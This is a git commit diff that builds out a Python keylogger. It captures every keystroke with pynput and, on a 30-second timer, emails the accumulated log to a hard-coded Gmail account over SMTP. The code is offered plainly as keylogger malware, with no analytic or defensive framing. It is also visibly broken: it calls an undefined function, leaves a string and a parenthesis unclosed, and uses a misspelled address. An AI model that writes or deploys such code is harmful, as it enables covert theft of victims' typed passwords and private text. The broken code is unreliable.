2ce8b0474c627ef392283b4fce4b3e25bb322918
Elliot Alderson <75475436+15586526@users.noreply.github.com>
2023-08-28 02:42:41 +0300

    keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,26 +1,46 @@
-import pynput.keyboard              
-from pynput import keyboard        
+import pynput.keyboard
+import smtplib
+import threading
+
+list_key = ""
 
 
-log = ""
+def callback_function(key):
+    global list_key
+    try:
+        list_key = list_key + str(key.char)     
+                                                
+    except AttributeError:                      
+        if key == pynput.keyboard.Key.esc:
+            return False
+        if key == pynput.keyboard.Key.space:
+            list_key = list_key + " "
+        if key == pynput.keyboard.Key.backspace:
+            list_key = list_key[:-1]
+        else:
+            list_key = list_key + str(key)
+    except:
+        pass     
+    print(list_key)
+        
+def send_email_function(email,password,message):
+    email_server = smtplib.SMTP("smtp.gmail.com",587)
+    email_server.starttls()
+    email_server.login(email,password)
+    email_server.sendmail(email,email,message)
+    email_server.quit()
 
-def callback_function(key): 
-    log = log + str(key)          
-
-    if log == "AttributeError":   
-        log + " "
-
-    if key == pynput.keyboard.Key.space:        
-        log = log + " "
-    print(log)                   
-      
-    if key == pynput.keyboard.Key.esc:   
-        return False
-
+def thread_function():
+    global list_key
+    send_email("testtest@gmal.com","testpassword",list_key.encode("utf-8)
+    list_key = ""
+    threading_start = threading.Timer(30,thread_function)
+    threading_start.start()
+    
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function) 
 
-
-with keylogger_listener:    
+with keylogger_listener:
+    thread_function()
     keylogger_listener.join() 
 
 
